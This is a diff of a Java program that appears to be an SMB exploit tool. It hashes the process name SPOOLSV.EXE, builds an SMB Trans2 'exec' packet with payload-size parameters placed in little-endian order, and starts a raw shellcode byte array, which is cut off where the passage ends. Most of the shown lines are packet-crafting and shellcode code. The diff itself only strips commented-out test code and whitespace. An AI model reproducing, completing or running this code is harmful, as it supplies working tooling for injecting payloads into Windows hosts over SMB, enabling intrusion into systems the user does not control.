@@ -149,33 +149,7 @@ public class Main {
         String procName = "SPOOLSV.EXE";
         int hash = generateProcessHash(procName);
         System.out.printf("Process Hash for %s: 0x%08X%n", procName, hash);
-        
-        /*
-        ByteBuffer parameters = ByteBuffer.allocate(12);
-        parameters.order(ByteOrder.LITTLE_ENDIAN);
-
-        // First 4 bytes: 0x50D800
-        parameters.putInt(0x0050D800); // Note: 0x50D800 fits into 4 bytes
-
-        // Second 4 bytes: 4096
-        parameters.putInt(4096);
-
-        // Last 4 bytes: 0
-        parameters.putInt(0);
-
-        // Get the byte array
-        byte[] byteArray = parameters.array();
-
-        // Print the byte array in hex to verify
-        for (byte b : byteArray) {
-            System.out.printf("%02X ", b);
-        }
-        System.out.printf("\n\n");*/
-
-    
-        //copy bytebuffer to bytebuffer
-        //https://stackoverflow.com/questions/3366925/deep-copy-duplicate-of-javas-bytebuffer
-        
+	
         byte[] Parameters = new byte[12];
 
         int TotalSizeOfPayload = 4096; // 0x50D800
@@ -187,7 +161,6 @@ public class Main {
         // Store byteCount into byteArray at offset 0x43 (67)
         trans2_exec[0x43] = (byte) (byteCount & 0xFF);       // lower byte
         trans2_exec[0x44] = (byte) ((byteCount >> 8) & 0xFF); // upper byte
-
 
         // Manually place TotalSizeOfPayload in little-endian
         Parameters[0] = (byte) (TotalSizeOfPayload);
@@ -222,7 +195,7 @@ public class Main {
             System.out.printf("%02X ", b);
         }
         System.out.printf("\n");
-        
+	    
         byte[] hMem = new byte[4096];
         byte[] shellcode = new byte[] {
                     (byte)0x31, (byte)0xc9, (byte)0x41, (byte)0xe2, (byte)0x01, (byte)0xc3, (byte)0x56, (byte)0x41, (byte)0x57, (byte)0x41, (byte)0x56, (byte)0x41, (byte)0x55, (byte)0x41, (byte)0x54, (byte)0x53,
